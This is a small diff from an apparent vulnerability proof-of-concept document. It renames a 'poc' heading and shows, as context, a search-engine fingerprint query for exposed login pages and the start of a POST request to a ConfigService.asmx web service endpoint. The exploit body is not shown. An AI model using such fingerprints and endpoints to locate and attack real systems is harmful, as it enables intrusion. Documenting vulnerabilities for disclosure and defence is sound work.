@@ -8,7 +8,7 @@
 header="Services/Identification/login.ashx" || banner="Services/Identification/login.ashx"
 ```
 
-## poc
+## POC
 
 ```xml
 POST /Webservice/IM/Config/ConfigService.asmx HTTP/1.1
